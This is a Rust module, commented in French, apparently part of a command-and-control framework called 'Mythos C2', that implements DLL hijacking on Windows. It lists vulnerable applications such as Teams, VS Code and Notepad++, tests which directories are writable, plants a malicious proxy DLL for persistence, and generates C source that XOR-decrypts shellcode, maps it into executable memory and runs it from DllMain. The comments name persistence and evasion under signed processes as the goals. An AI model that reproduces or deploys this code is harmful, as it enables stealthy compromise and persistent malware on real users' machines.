// inject/dll_hijack.rs — DLL Hijacking
//
// Le DLL Hijacking exploite l'ordre de recherche des DLLs par Windows.
//
// Ordre de recherche Windows (SafeDllSearchMode activé) :
//   1. Répertoire du .exe de l'application
//   2. System32 (C:\Windows\System32)
//   3. System16 (C:\Windows\System)
//   4. Répertoire Windows (C:\Windows)
//   5. Répertoire courant
//   6. Répertoires dans %PATH%
//
// Si on place notre DLL malveillante dans le répertoire d'une application
// légitime AVANT que Windows trouve la vraie DLL, notre DLL est chargée.
//
// Exemple classique :
//   - Teams.exe cherche version.dll dans son répertoire
//   - version.dll n'est normalement que dans System32
//   - On place notre version.dll dans C:\Users\...\AppData\Teams\
//   - Teams charge notre DLL → notre code s'exécute sous Teams.exe
//
// Avantage : Persistance + évasion (code sous un processus signé Microsoft/éditeur)

use std::fs;
use std::path::{Path, PathBuf};

/// DllHijackTarget — une cible de DLL hijacking identifiée
#[derive(Debug, Clone)]
pub struct DllHijackTarget {
    /// Application légitime qui fait le chargement
    pub app_path:     PathBuf,
    /// DLL manquante ou shadovable
    pub dll_name:     String,
    /// Répertoire où déposer la DLL malveillante
    pub drop_path:    PathBuf,
    /// Est-ce que la DLL originale doit être proxifiée ?
    pub needs_proxy:  bool,
}

/// KNOWN_HIJACK_TARGETS — cibles connues avec DLL hijacking possible
/// Source : https://hijacklibs.net/
pub const KNOWN_HIJACK_TARGETS: &[(&str, &str)] = &[
    // Application                    → DLL manquante
    (r"C:\Program Files\Microsoft Teams\current\Teams.exe",    "version.dll"),
    (r"C:\Program Files\Microsoft VS Code\Code.exe",           "CRYPTSP.dll"),
    (r"C:\Program Files\7-Zip\7zFM.exe",                       "UXTheme.dll"),
    (r"C:\Windows\System32\calc.exe",                          "VERSION.dll"),  // Lab only
    (r"C:\Program Files\Notepad++\notepad++.exe",              "UxTheme.dll"),
    (r"C:\Program Files (x86)\Wireshark\Wireshark.exe",        "airpcap.dll"),
];

/// find_hijack_opportunities — cherche des opportunités de DLL hijacking
/// Retourne les cibles valides trouvées sur le système
pub fn find_hijack_opportunities() -> Vec<DllHijackTarget> {
    let mut targets = Vec::new();

    for (app_path, dll_name) in KNOWN_HIJACK_TARGETS {
        let app = Path::new(app_path);
        if !app.exists() {
            continue;
        }

        // Le répertoire de l'app doit être accessible en écriture
        let drop_dir = app.parent().unwrap();
        let dll_drop_path = drop_dir.join(dll_name);

        // Vérifier si on peut écrire dans ce répertoire
        if is_writable(drop_dir) && !dll_drop_path.exists() {
            targets.push(DllHijackTarget {
                app_path:    app.to_path_buf(),
                dll_name:    dll_name.to_string(),
                drop_path:   dll_drop_path,
                needs_proxy: true, // La plupart des DLLs nécessitent le proxy
            });
        }
    }

    targets
}

/// deploy_hijack_dll — dépose la DLL malveillante au bon endroit
///
/// La DLL déposée est un proxy DLL :
///   - Elle exporte toutes les fonctions de la vraie DLL
///   - En plus, elle exécute notre shellcode au chargement (DllMain)
///   - L'application fonctionne normalement → moins suspect
pub fn deploy_hijack_dll(target: &DllHijackTarget, dll_bytes: &[u8]) -> Result<(), String> {
    fs::write(&target.drop_path, dll_bytes)
        .map_err(|e| format!("Failed to write DLL to {:?}: {}", target.drop_path, e))?;

    Ok(())
}

/// generate_proxy_dll_template — génère le source C d'une DLL proxy
///
/// Ce template doit être compilé en DLL et fourni comme `dll_bytes`.
/// Il exporte les fonctions de la DLL originale en les forwardant,
/// et exécute le shellcode dans un thread au chargement.
///
/// Usage : Ce code est compilé séparément, pas à l'exécution.
pub fn generate_proxy_dll_template(
    original_dll: &str,
    exports: &[&str],
    shellcode_placeholder: &str,
) -> String {
    let forward_pragmas: String = exports
        .iter()
        .map(|&exp| {
            format!(
                "#pragma comment(linker, \"/EXPORT:{}={}.{},@1\")\n",
                exp, original_dll.trim_end_matches(".dll"), exp
            )
        })
        .collect();

    format!(r#"
// Proxy DLL généré par Mythos C2
// DLL originale : {original_dll}
// Exporte toutes les fonctions originales via pragma forwarding

#include <windows.h>

// Forward exports vers la DLL originale
{forward_pragmas}

// Shellcode à exécuter au chargement (XOR chiffré)
unsigned char shellcode[] = {{ {shellcode_placeholder} }};
unsigned char key[] = {{ 0x41, 0x42, 0x43, 0x44 }};

// Déchiffrement XOR en mémoire
void decrypt_shellcode(unsigned char* sc, size_t len, unsigned char* k, size_t klen) {{
    for (size_t i = 0; i < len; i++) {{
        sc[i] ^= k[i % klen];
    }}
}}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {{
    if (fdwReason == DLL_PROCESS_ATTACH) {{
        // Désactiver les notifications DLL_THREAD_ATTACH/DETACH
        DisableThreadLibraryCalls(hinstDLL);

        // Déchiffrer le shellcode
        decrypt_shellcode(shellcode, sizeof(shellcode), key, sizeof(key));

        // Allouer de la mémoire exécutable
        LPVOID mem = VirtualAlloc(NULL, sizeof(shellcode),
                                   MEM_COMMIT | MEM_RESERVE,
                                   PAGE_EXECUTE_READWRITE);
        if (mem) {{
            // Copier et exécuter le shellcode dans un thread
            memcpy(mem, shellcode, sizeof(shellcode));
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)mem, NULL, 0, NULL);
        }}
    }}
    return TRUE;
}}
"#,
        original_dll = original_dll,
        forward_pragmas = forward_pragmas,
        shellcode_placeholder = shellcode_placeholder,
    )
}

/// persistence_via_hijack — installe une persistance via DLL hijacking
///
/// Méthode : déposer la DLL dans un répertoire d'auto-démarrage
/// Quand l'application redémarre (login, service restart), la DLL est rechargée.
pub fn persistence_via_hijack(target: &DllHijackTarget, dll_bytes: &[u8]) -> Result<String, String> {
    deploy_hijack_dll(target, dll_bytes)?;

    Ok(format!(
        "DLL hijack installé: {:?} → {:?}\nSera exécuté au prochain lancement de {:?}",
        target.dll_name, target.drop_path, target.app_path
    ))
}

/// Vérifie si un répertoire est accessible en écriture
fn is_writable(path: &Path) -> bool {
    let test_file = path.join(".mythos_test");
    match fs::write(&test_file, b"") {
        Ok(_) => {
            let _ = fs::remove_file(&test_file);
            true
        }
        Err(_) => false,
    }
}
